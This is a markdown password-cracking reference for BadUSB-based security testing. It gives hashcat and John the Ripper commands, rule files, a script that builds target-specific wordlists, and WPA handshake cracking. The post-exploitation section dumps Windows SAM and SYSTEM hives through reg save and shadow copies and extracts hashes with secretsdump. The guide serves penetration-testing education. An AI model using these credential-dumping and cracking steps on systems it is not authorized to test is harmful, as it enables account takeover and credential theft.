# Password Cracking Reference Guide

## Overview

This guide covers password cracking techniques relevant to BadUSB operations, including credential extraction, hash types, and cracking tools. **For authorized security testing only.**

---

## Hash Types Encountered in BadUSB Operations

### Windows Credentials

| Hash Type | Format | Example |
|-----------|--------|---------|
| NTLM | 32 hex chars | `a87f3a337d73085c45f9416be5787d86` |
| LM | 32 hex chars (deprecated) | `aad3b435b51404ee:...` |
| NetNTLMv1 | u::d:hash:hash:chall | `user::domain:hash...` |
| NetNTLMv2 | u::d:sc:cc:hash | `user::domain:server:client:hash` |
| Kerberos TGT | $krb5tgs$... | `$krb5tgs$23$*user$...` |

### Common File Formats

| Type | Hashcat Mode | John Format |
|------|--------------|-------------|
| NTLM | 1000 | nt |
| NetNTLMv2 | 5600 | netntlmv2 |
| SHA-256 | 1400 | raw-sha256 |
| MD5 | 0 | raw-md5 |
| bcrypt | 3200 | bcrypt |
| WPA/WPA2 | 22000 | wpapsk |

---

## Hashcat Reference

### Common Modes for Security Testing

```bash
#!/bin/bash
#######################################
# Hashcat Quick Reference
#######################################

echo "Common Hashcat Modes for Security Testing:"
echo ""
echo "Windows:"
echo "  1000  - NTLM"
echo "  3000  - LM"
echo "  5600  - NetNTLMv2"
echo "  13100 - Kerberos TGS-REP (etype 23)"
echo "  18200 - Kerberos AS-REP (etype 23)"
echo ""
echo "WiFi:"
echo "  22000 - WPA-PBKDF2-PMKID+EAPOL"
echo "  22001 - WPA-PMKID-PBKDF2"
echo ""
echo "Linux:"
echo "  500   - md5crypt"
echo "  1800  - sha512crypt"
echo "  7400  - sha256crypt"
echo ""
echo "General:"
echo "  0     - MD5"
echo "  100   - SHA1"
echo "  1400  - SHA256"
echo "  1700  - SHA512"
echo "  3200  - bcrypt"
```

### Basic Hashcat Commands

```bash
#!/bin/bash
#######################################
# Hashcat Attack Examples
# For authorized testing only
#######################################

HASH_FILE="$1"
WORDLIST="/usr/share/wordlists/rockyou.txt"

if [ -z "$HASH_FILE" ]; then
    echo "Usage: $0 <hash_file> [mode]"
    exit 1
fi

MODE="${2:-1000}"  # Default to NTLM

echo "[*] Hashcat Cracking Session"
echo "[*] Hash file: $HASH_FILE"
echo "[*] Mode: $MODE"
echo ""

# Dictionary attack
echo "[1] Dictionary Attack:"
echo "hashcat -m $MODE -a 0 $HASH_FILE $WORDLIST"
echo ""

# Dictionary + rules
echo "[2] Dictionary + Rules:"
echo "hashcat -m $MODE -a 0 $HASH_FILE $WORDLIST -r /usr/share/hashcat/rules/best64.rule"
echo ""

# Brute force (8 char, lower+digit)
echo "[3] Brute Force (8 chars):"
echo "hashcat -m $MODE -a 3 $HASH_FILE ?l?l?l?l?l?d?d?d"
echo ""

# Mask attack with custom charset
echo "[4] Mask Attack (Company2024!):"
echo "hashcat -m $MODE -a 3 $HASH_FILE Company?d?d?d?d?s"
```

### Hashcat Rules

```
# Common rule modifications
# Save as custom.rule

# Append numbers
$0
$1
$2
$0$0
$1$2$3

# Append special chars
$!
$@
$#

# Capitalize first letter
c

# Toggle case
t

# Reverse
r

# Duplicate
d

# Common password patterns
c$1
c$!
c$1$!
$2$0$2$4
$2$0$2$5
```

---

## John the Ripper Reference

### Format Detection

```bash
#!/bin/bash
#######################################
# John the Ripper Format Detection
#######################################

HASH_FILE="$1"

if [ -z "$HASH_FILE" ]; then
    echo "Usage: $0 <hash_file>"
    exit 1
fi

echo "[*] Detecting hash format..."
john --list=formats 2>/dev/null | head -5

echo ""
echo "[*] Attempting auto-detect:"
john --show "$HASH_FILE" 2>&1 | head -10

# Manual format hints
echo ""
echo "[*] Common formats:"
echo "  --format=nt         # Windows NTLM"
echo "  --format=netntlmv2  # Network NTLM v2"
echo "  --format=raw-sha256 # Plain SHA256"
echo "  --format=bcrypt     # bcrypt"
```

### John Commands

```bash
#!/bin/bash
#######################################
# John the Ripper Attack Examples
#######################################

HASH_FILE="$1"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Basic dictionary attack
echo "[1] Dictionary Attack:"
echo "john --wordlist=$WORDLIST $HASH_FILE"
echo ""

# With rules
echo "[2] With Rules:"
echo "john --wordlist=$WORDLIST --rules=best64 $HASH_FILE"
echo ""

# Incremental (brute force)
echo "[3] Incremental Mode:"
echo "john --incremental $HASH_FILE"
echo ""

# Show cracked passwords
echo "[4] Show Results:"
echo "john --show $HASH_FILE"
```

---

## Wordlist Management

### Essential Wordlists

```bash
#!/bin/bash
#######################################
# Wordlist Setup for Security Testing
#######################################

WORDLIST_DIR="$HOME/wordlists"
mkdir -p "$WORDLIST_DIR"

echo "[*] Setting up wordlists..."

# Check for rockyou
if [ ! -f "$WORDLIST_DIR/rockyou.txt" ]; then
    echo "[*] rockyou.txt not found"
    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
        echo "[*] Extracting from system..."
        gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$WORDLIST_DIR/rockyou.txt"
    fi
fi

# Create targeted wordlists
echo "[*] Creating targeted wordlists..."

# Seasons + years
cat > "$WORDLIST_DIR/seasonal.txt" << 'EOF'
Spring2024
Summer2024
Fall2024
Winter2024
Spring2025
Summer2025
EOF

# Common patterns
cat > "$WORDLIST_DIR/patterns.txt" << 'EOF'
Password1
Password1!
P@ssw0rd
Welcome1
Welcome1!
Changeme1
Company123
Admin123
EOF

echo "[+] Wordlists ready in: $WORDLIST_DIR"
ls -la "$WORDLIST_DIR"
```

### Custom Wordlist Generation

```bash
#!/bin/bash
#######################################
# Generate Custom Wordlist
# Based on target information
#######################################

COMPANY="$1"
YEAR=$(date +%Y)
OUTPUT="custom_wordlist.txt"

if [ -z "$COMPANY" ]; then
    echo "Usage: $0 <company_name>"
    exit 1
fi

echo "[*] Generating wordlist for: $COMPANY"

# Base words
BASE_WORDS=(
    "$COMPANY"
    "$(echo $COMPANY | tr '[:upper:]' '[:lower:]')"
    "$(echo $COMPANY | tr '[:lower:]' '[:upper:]')"
)

# Common suffixes
SUFFIXES=(
    "1" "123" "1234" "12345"
    "!" "@" "#" "1!" "123!"
    "$YEAR" "$((YEAR-1))" "$((YEAR+1))"
    "$(date +%m%Y)"
)

# Generate combinations
> "$OUTPUT"
for base in "${BASE_WORDS[@]}"; do
    echo "$base" >> "$OUTPUT"
    for suffix in "${SUFFIXES[@]}"; do
        echo "${base}${suffix}" >> "$OUTPUT"
        echo "${base}@${suffix}" >> "$OUTPUT"
    done
done

# Add variations
sed 's/a/@/g' "$OUTPUT" >> "${OUTPUT}.tmp"
sed 's/e/3/g' "$OUTPUT" >> "${OUTPUT}.tmp"
sed 's/i/1/g' "$OUTPUT" >> "${OUTPUT}.tmp"
sed 's/o/0/g' "$OUTPUT" >> "${OUTPUT}.tmp"
cat "${OUTPUT}.tmp" >> "$OUTPUT"
rm "${OUTPUT}.tmp"

# Remove duplicates
sort -u "$OUTPUT" -o "$OUTPUT"

echo "[+] Generated $(wc -l < $OUTPUT) passwords"
echo "[+] Saved to: $OUTPUT"
```

---

## Credential Extraction (Post-Exploitation)

### SAM Database Extraction

```powershell
# Windows - Extract SAM hashes (requires SYSTEM)
# For authorized testing only

# Method 1: Using reg save
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Method 2: Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
```

### Extract with secretsdump

```bash
#!/bin/bash
#######################################
# Extract hashes from SAM/SYSTEM
#######################################

SAM_FILE="$1"
SYSTEM_FILE="$2"

if [ -z "$SAM_FILE" ] || [ -z "$SYSTEM_FILE" ]; then
    echo "Usage: $0 <sam_file> <system_file>"
    exit 1
fi

echo "[*] Extracting hashes..."
impacket-secretsdump -sam "$SAM_FILE" -system "$SYSTEM_FILE" LOCAL

# Alternative with samdump2
echo ""
echo "[*] Alternative method:"
echo "samdump2 $SYSTEM_FILE $SAM_FILE"
```

---

## WiFi Handshake Cracking

### Capture to Hash Conversion

```bash
#!/bin/bash
#######################################
# WiFi Handshake Processing
#######################################

CAPTURE_FILE="$1"

if [ -z "$CAPTURE_FILE" ]; then
    echo "Usage: $0 <capture.pcap>"
    exit 1
fi

echo "[*] Converting capture to hashcat format..."

# For WPA/WPA2
if command -v hcxpcapngtool &>/dev/null; then
    hcxpcapngtool -o hash.22000 "$CAPTURE_FILE"
    echo "[+] Created hash.22000 for hashcat mode 22000"
else
    echo "[!] hcxpcapngtool not found"
    echo "[*] Install: apt install hcxtools"
fi

# Alternative: cap2hccapx (older method)
if [ -f /usr/bin/cap2hccapx ]; then
    cap2hccapx "$CAPTURE_FILE" hash.hccapx
    echo "[+] Created hash.hccapx for hashcat mode 2500"
fi
```

### WiFi Cracking Commands

```bash
#!/bin/bash
#######################################
# WiFi Password Cracking
#######################################

HASH_FILE="$1"
WORDLIST="/usr/share/wordlists/rockyou.txt"

if [ -z "$HASH_FILE" ]; then
    echo "Usage: $0 <hash_file>"
    exit 1
fi

echo "[*] WiFi Cracking Options:"
echo ""

# Modern format (22000)
if [[ "$HASH_FILE" == *.22000 ]]; then
    echo "[*] Using mode 22000 (PMKID+EAPOL)"
    echo "hashcat -m 22000 $HASH_FILE $WORDLIST"
fi

# Legacy format (2500)
if [[ "$HASH_FILE" == *.hccapx ]]; then
    echo "[*] Using mode 2500 (legacy WPA)"
    echo "hashcat -m 2500 $HASH_FILE $WORDLIST"
fi

echo ""
echo "[*] Common WiFi password patterns:"
echo "hashcat -m 22000 -a 3 $HASH_FILE ?d?d?d?d?d?d?d?d"
echo "hashcat -m 22000 -a 3 $HASH_FILE ?l?l?l?l?l?l?d?d"
```

---

## Password Analysis

### Analyze Cracked Passwords

```bash
#!/bin/bash
#######################################
# Password Pattern Analysis
#######################################

CRACKED_FILE="$1"

if [ -z "$CRACKED_FILE" ]; then
    echo "Usage: $0 <cracked_passwords.txt>"
    exit 1
fi

echo "[*] Password Analysis Report"
echo "=============================="
echo ""

# Total count
TOTAL=$(wc -l < "$CRACKED_FILE")
echo "[*] Total passwords: $TOTAL"
echo ""

# Length distribution
echo "[*] Length Distribution:"
while read -r pass; do
    echo ${#pass}
done < "$CRACKED_FILE" | sort -n | uniq -c | sort -rn | head -10
echo ""

# Character composition
echo "[*] Character Types:"
LOWER=$(grep -c '[a-z]' "$CRACKED_FILE")
UPPER=$(grep -c '[A-Z]' "$CRACKED_FILE")
DIGIT=$(grep -c '[0-9]' "$CRACKED_FILE")
SPECIAL=$(grep -cE '[!@#$%^&*]' "$CRACKED_FILE")
echo "  Lowercase: $LOWER"
echo "  Uppercase: $UPPER"
echo "  Digits: $DIGIT"
echo "  Special: $SPECIAL"
echo ""

# Common patterns
echo "[*] Common Patterns:"
echo "  Ends with number: $(grep -cE '[0-9]$' "$CRACKED_FILE")"
echo "  Ends with !: $(grep -c '!$' "$CRACKED_FILE")"
echo "  Contains year: $(grep -cE '20[0-9][0-9]' "$CRACKED_FILE")"
echo "  Starts capital: $(grep -cE '^[A-Z]' "$CRACKED_FILE")"
```

---

## Performance Optimization

### Hashcat Performance Tips

```bash
#!/bin/bash
#######################################
# Hashcat Performance Check
#######################################

echo "[*] Checking GPU status..."
hashcat -I

echo ""
echo "[*] Benchmark common modes:"
echo ""

# Quick benchmark
hashcat -b -m 1000 --quiet  # NTLM
hashcat -b -m 22000 --quiet # WPA

echo ""
echo "[*] Optimization flags:"
echo "  -w 3             # Workload profile (1-4)"
echo "  -O               # Optimized kernels"
echo "  --force          # Ignore warnings"
echo "  -D 1,2           # Device types (1=CPU, 2=GPU)"
```

### Distributed Cracking

```bash
#!/bin/bash
#######################################
# Distributed Hashcat Setup
#######################################

# Split wordlist for multiple machines
WORDLIST="rockyou.txt"
PARTS=4

echo "[*] Splitting wordlist into $PARTS parts..."

TOTAL_LINES=$(wc -l < "$WORDLIST")
LINES_PER_PART=$((TOTAL_LINES / PARTS))

split -l $LINES_PER_PART "$WORDLIST" wordlist_part_

echo "[+] Created:"
ls -la wordlist_part_*

echo ""
echo "[*] Run on each machine:"
echo "hashcat -m MODE HASH wordlist_part_XX"
```

---

## Quick Reference Card

### Hashcat Mask Characters

| Char | Meaning |
|------|---------|
| ?l | Lowercase (a-z) |
| ?u | Uppercase (A-Z) |
| ?d | Digit (0-9) |
| ?s | Special (!@#$...) |
| ?a | All printable |
| ?b | Binary (0x00-0xff) |

### Common Attack Types

| Flag | Type | Description |
|------|------|-------------|
| -a 0 | Dictionary | Wordlist attack |
| -a 1 | Combination | Word1+Word2 |
| -a 3 | Brute-force | Mask-based |
| -a 6 | Hybrid | Wordlist+Mask |
| -a 7 | Hybrid | Mask+Wordlist |

---

## Ethical Considerations

**This guide is for authorized security testing only.**

1. Only crack passwords you have permission to test
2. Document all testing activities
3. Report vulnerabilities responsibly
4. Never use cracked credentials maliciously
5. Follow your organization's security policies

---

[← Back to Technical Addendum](../README.md)
